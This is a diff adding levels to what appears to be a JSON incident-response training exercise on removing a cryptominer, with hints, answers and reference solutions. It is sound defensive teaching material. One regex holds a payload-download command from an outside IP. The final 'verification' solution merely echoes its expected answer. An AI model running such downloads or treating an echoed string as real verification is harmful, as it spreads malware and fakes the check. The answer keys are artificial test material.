+          "title": "Conceptual Hint",
+          "content": "Eliminate service persistence to prevent reinfection after reboot.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `systemctl` command to disable the malicious service.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Disable the service using its name.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "remove_service_persistence",
+          "prereq_state": [],
+          "cmd": "systemctl disable sys-monitor",
+          "cmd_type": "bash-command",
+          "cmd_regex": "systemctl disable sys-monitor",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Remove Scheduled Task",
+      "level_type": "TRAINING_LEVEL",
+      "order": 24,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "crontab -r",
+      "answer_variable_name": null,
+      "content": "Remove the scheduled task used to maintain persistence on the `miner-host` system.",
+      "solution": "Eliminate scheduled execution persistence mechanisms. The scheduled task that was removed is `sysupdate`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Eliminate scheduled execution persistence mechanisms.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `crontab` command to remove the scheduled task.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Remove the scheduled task using the `crontab -r` command.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "remove_scheduled_task",
+          "prereq_state": [],
+          "cmd": "crontab -r",
+          "cmd_type": "bash-command",
+          "cmd_regex": "crontab -r",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Remove Malicious Executable",
+      "level_type": "TRAINING_LEVEL",
+      "order": 25,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "rm -f /usr/local/sbin/xmrig",
+      "answer_variable_name": null,
+      "content": "Remove the malicious executable and associated artifacts from the `miner-host` system.",
+      "solution": "Perform eradication while preserving relevant forensic evidence. The filename or file path of the malicious executable that was removed is `/usr/local/sbin/xmrig`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Perform eradication while preserving relevant forensic evidence.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Use the `rm` command to remove the malicious executable.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Remove the malicious executable using the `rm -f` command.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "remove_malicious_executable",
+          "prereq_state": [],
+          "cmd": "rm -f /usr/local/sbin/xmrig",
+          "cmd_type": "bash-command",
+          "cmd_regex": "rm -f /usr/local/sbin/xmrig",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Confirm Initial Host Compromise",
+      "level_type": "TRAINING_LEVEL",
+      "order": 26,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/home/cyrano/.bash_history",
+      "answer_variable_name": null,
+      "content": "Identify evidence confirming compromise of the initially infected host, `miner-host`.",
+      "solution": "Verify compromise using forensic indicators collected from the host. The filename confirming the compromise is `/home/cyrano/.bash_history`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Verify compromise using forensic indicators collected from the host.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Review the collected forensic evidence to identify indicators of compromise.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for evidence of unauthorized processes, network connections, and persistence mechanisms.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "confirm_initial_host_compromise",
+          "prereq_state": [],
+          "cmd": "cat /home/cyrano/.bash_history",
+          "cmd_type": "bash-command",
+          "cmd_regex": "wget http://185.183.98.46/.installer",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Confirm Secondary Host Compromise",
+      "level_type": "TRAINING_LEVEL",
+      "order": 27,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "/home/cyrano/sys-update.log",
+      "answer_variable_name": null,
+      "content": "Identify evidence confirming compromise of the laterally infected host, `second-host`.",
+      "solution": "Validate successful investigation of malware propagation across hosts. The filename confirming the compromise is `/home/cyrano/sys-update.log`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Validate successful investigation of malware propagation across hosts.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Review the collected forensic evidence from both hosts to identify indicators of compromise.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Look for evidence of unauthorized processes, network connections, and persistence mechanisms on both hosts.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "confirm_secondary_host_compromise",
+          "prereq_state": [],
+          "cmd": "ls -la /home/cyrano/",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sys-update.log",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Verify Cryptominer Removal",
+      "level_type": "TRAINING_LEVEL",
+      "order": 28,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "No malicious processes",
+      "answer_variable_name": null,
+      "content": "Verify that the cryptominer has been successfully removed from the `miner-host` system and that no malicious processes, persistence mechanisms, or mining communications remain.",
+      "solution": "Validate the effectiveness of containment and eradication actions. The verification checklist or absence of expected indicators confirming successful removal is `No malicious processes`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Conceptual Hint",
+          "content": "Validate the effectiveness of containment and eradication actions.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "File/Tool/Location Hint",
+          "content": "Review the system for any remaining indicators of compromise.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Methodology Hint",
+          "content": "Check for the absence of unauthorized processes, network connections, and persistence mechanisms.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "verify_cryptominer_removal",
+          "prereq_state": [],
+          "cmd": "echo 'No malicious processes'",
+          "cmd_type": "bash-command",
+          "cmd_regex": "No malicious processes",
+          "optional": false
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    }
+  ],
+  "estimated_duration": 280,
+  "variant_sandboxes": false
+}
